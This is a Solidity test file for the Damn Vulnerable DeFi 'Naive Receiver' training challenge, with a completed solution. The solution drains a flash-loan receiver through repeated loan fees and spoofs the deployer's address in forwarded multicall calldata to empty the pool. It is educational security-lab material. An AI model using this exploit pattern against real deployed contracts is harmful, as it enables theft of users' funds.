// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        /*
        deployer, recovery, player, weth, pool, receiver
        */

        console.log("The address of weth: ", address(weth));
        console.log("The address of deployer: ", address(deployer));
        console.log("The address of recovery: ", address(recovery));
        console.log("The address of player: ", address(player));
        console.log("The address of pool: ", address(pool));
        console.log("The address of receiver: ", address(receiver));

        console.log("The total weth balance of deployer: ",weth.balanceOf(deployer));
        console.log("The total weth balance of recovery: ",weth.balanceOf(recovery));
        console.log("The total weth balance of deployer in the pool: ",pool.deposits(deployer));
        // The pool was initially minted the value of 1000 weth
        console.log("The total weth balance of pool contract: ",weth.balanceOf(address(pool)));
        // The receiver was initially minted the value of 10 weth
        console.log("The total weth balance of receiver: ",weth.balanceOf(address(receiver)));

        /*
        VULNERABILITY-1: the receiver contract just checks if the call is made from the lender contract, and does not check who initiated the call.

        VULNERABILITY-2: the pool contract uses multiple transaction but fails to properly check who the caller actually was. As a result, an attacker can spoof as someone else.
        return address(bytes20(msg.data[msg.data.length - 20:]));
        */
        

        // since the pool contract allows multicall transaction, we will append multiple transactions and send just 1 transaction to it.
        // The first 10 elements will be a call to the flashLoan() function to take flashloan on behalf of the receiver. The last element will be a call to the withdraw() disguised as the deployer.
        bytes[] memory full_data = new bytes[](11);

        bytes memory call1 = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 10 ether, bytes("")));
        // we want to withdraw the amount from the deployer to the player, and then since the player is the attacker, it will move the amount to the recovery
        bytes memory call2 = abi.encodePacked(
            // abi.encodeCall(pool.withdraw,(pool.totalDeposits(), payable(player))),  // pool.totalDeposits() = 1000 and not 1010 when read initially. this will read the data before the flash loan is executed.
            abi.encodeCall(pool.withdraw,( WETH_IN_POOL+WETH_IN_RECEIVER, payable(player) )), 
            deployer // attacker is appending the last 20 bytes as the address of the deployer to bypass the vulnerable check.
        );

        // making the final data to send to the multicall function in the pool contract.
        for (uint256 i=0; i<=9; i++){
            full_data[i] = call1;
        }
        full_data[10] = call2;

        // NOW WE WILL SIGN IT USING THIS SOLIDITY ATTACKER CONTRACT INSTEAD OF USING ether.js
        // since Request is a stuct type, we need to define this type first.
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player, // this is the address of the user/attacker that want to make the transaction with the target contract.
            target: address(pool), // this is the address of the target contract
            value: 0, // we do not want to send any ether to the multicall function of the target contract.
            gas: 1000000,
            nonce: 0,
            data: abi.encodeCall(pool.multicall, (full_data)), // making a call to the multicall target function
            deadline: block.timestamp
        });

        // Prepare the signature
        bytes32 digest = keccak256(
                abi.encodePacked(
                    "\x19\x01",
                    forwarder.domainSeparator(), // forwarder: address of the meta-transaction forwarder
                    forwarder.getDataHash(request) // forwarder: address of the meta-transaction forwarder
                ));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v); // this is the final signature
        
        // the request and the signature is sent to the forwarder function, which will inturn make a call to the target contract multicall function.
        forwarder.execute(request, signature);

        console.log("Final fund of the attacker/player after the attack before transferring ether to recovery: ", weth.balanceOf(player));
        console.log("Initial ether balance of the deployer: ", weth.balanceOf(deployer));
        console.log("Initial ether balance of the recovery: ", weth.balanceOf(recovery));
        // pool.totalDeposits() is now 0 and therefore, it will return 0
        // weth.transfer(recovery, pool.totalDeposits()); // sending the total ether from the player to the recovery
        weth.transfer(recovery, WETH_IN_POOL+WETH_IN_RECEIVER); // sending the total ether from the player to the recovery
        console.log("Final ether balance of the recovery: ", weth.balanceOf(recovery));
        console.log("Final ether balance of the deployer: ", weth.balanceOf(deployer));
        console.log("Final fund of the attacker/player after the transfer to the deployer: ", weth.balanceOf(player));
        console.log("Final total weth balance of pool contract: ",weth.balanceOf(address(pool)));
        console.log("Final total weth balance of receiver: ",weth.balanceOf(address(receiver)));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
